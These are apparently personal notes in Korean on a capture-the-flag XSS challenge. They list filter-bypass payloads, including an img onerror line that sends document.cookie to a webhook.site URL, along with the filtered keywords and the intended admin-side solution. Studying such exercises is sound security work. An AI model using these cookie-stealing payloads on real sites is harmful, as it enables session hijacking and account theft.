#web-hacking #incomplete
```text
<img src=x oonnerror="locatioonn.href=('https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6?cookie='+document.cookie);">

<iframe src="https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6"></iframe>
```
- iframe, svg가 힌트.
	- src, srcdoc 속성이 있음
- HTML 인코딩, 구분자를 우회하기 위해 괄호, 탭, cr/lf를 사용해 봐도 된다.
- memo 페이지에 파라미터 전달로 페이로드를 남겨 관리자 pc에서 XSS 취약점을 터뜨리는 것이 정식 풀이이다.
	- 웹훅이 없어도 풀이가 가능하게
	- ex) `location.href='/memo?memo='+document.cookie`
- 필터링 되는 문자열
	- `script`, `on`, `javascript`, `window`, `self`, `this`, `document`, `location`, `(`, `)`, `&#`

iframe src=""
[https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6](https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6)

```html
<iframe src='/memo?memo='%2B'docu'%2B'ment'.cookie></iframe>
```
